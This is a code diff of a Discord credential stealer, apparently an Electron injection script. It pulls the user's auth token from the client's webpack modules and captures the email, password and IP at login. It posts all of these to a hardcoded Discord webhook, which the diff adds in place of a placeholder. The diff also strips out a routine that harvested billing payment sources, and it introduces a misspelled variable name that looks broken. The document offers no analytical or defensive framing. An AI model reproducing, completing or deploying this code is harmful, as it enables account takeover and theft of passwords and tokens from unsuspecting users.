@@ -4,7 +4,7 @@ const path = require('path');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron')
 const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
-var webhook = "%WEBHOOK_LINK%";
+var webhook = "https://discord.com/api/webhooks/943817228057448499/SPVPQn1AtGfaTy899WIn3UKUoNzi8nVCz2PtxfzZh1_zlVmd39tEKrA5X7dqrKViavad";
 
 function FirstTime() {
     if (!fs.existsSync(path.join(__dirname, "Blood"))) {
@@ -17,7 +17,7 @@ function FirstTime() {
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-    if (details.url.startsWith(webhook)) {
+    if (details.url.startsWith(webhoook)) {
         if (details.url.includes("discord.com")) {
             callback({
                 responseHeaders: Object.assign({
@@ -189,32 +189,6 @@ function Login(email, password, token) {
         xmlHttp.send( null );
         xmlHttp.responseText;
     `, !0).then((ip) => {
-        window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
-        xmlHttp.setRequestHeader("Authorization", "${token}");
-        xmlHttp.send( null );
-        xmlHttp.responseText;
-        `, !0).then((info3) => {
-            function Cool() {
-                const json = JSON.parse(info3)
-                var billing = "";
-                json.forEach(z => {
-                    if (z.type == "") {
-                        return "\`❌\`"
-                    } else if (z.type == 2 && z.invalid != !0) {
-                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
-                    } else if (z.type == 1 && z.invalid != !0) {
-                        billing += "\`✔️\`" + " :credit_card:"
-                    } else {
-                        return "\`❌\`"
-                    }
-                })
-                if (billing == "") {
-                    billing = "\`❌\`"
-                }
-                return billing
-            }
         const json = JSON.parse(info);
         var params = {
             username: "Atomic",
@@ -225,52 +199,31 @@ function Login(email, password, token) {
                     "color": 000000,
                     "fields": [
                         {
-                            "name": ":dollar: TOKEN",
+                            "name": ":unlock: | Token :",
                             "value": `\`${token}\``,
                             "inline": false
                         },
                         
                         
                         {
-                            "name": ":envelope_with_arrow: EMAIL",
-                            "value": `\`${email}\``,
-                            "inline": false
-                        },
-
-
-                        {
-                            "name": ":secret: PASSWORD",
-                            "value": `\`${password}\``,
+                            "name": "<:3809discordhypesquad:940583844367724644> | Account Info :",
+                            "value": `Email: \`${email}\` \nPassword: \`${password}\``,
                             "inline": false
                         },
                         
                         
                         {
-                            "name": "<:2937discordnitro:940583844233510982> NITRO",
-                            "value": `${GetNitro(json.premium_type)}`,
-                            "inline": false
-                        },
-                        
-                        
-                        {
-                            "name": "<:3809discordhypesquad:940583844367724644> BADGES",
-                            "value": `\`${GetBadges(json.flags)}\``,
+                            "name": "<a:discord_gif:709806861351911445> | Other :",
+                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
                             "inline": false
                         },
 
 
                         {
-                            "name": ":globe_with_meridians: IP ADDRESS",
+                            "name": ":globe_with_meridians: | Ip :",
                             "value": `Ip: \`${ip}\``,
                             "inline": false
                             
-                        },
-
-
-                        {
-                            "name": ":euro: Billing",
-                            "value": `${Cool()}`,
-                            "inline": false
                         }
                     ],
                     "author": {
@@ -285,7 +238,6 @@ function Login(email, password, token) {
         }
         SendToWebhook(JSON.stringify(params))
     })
-})
 })
 }
 
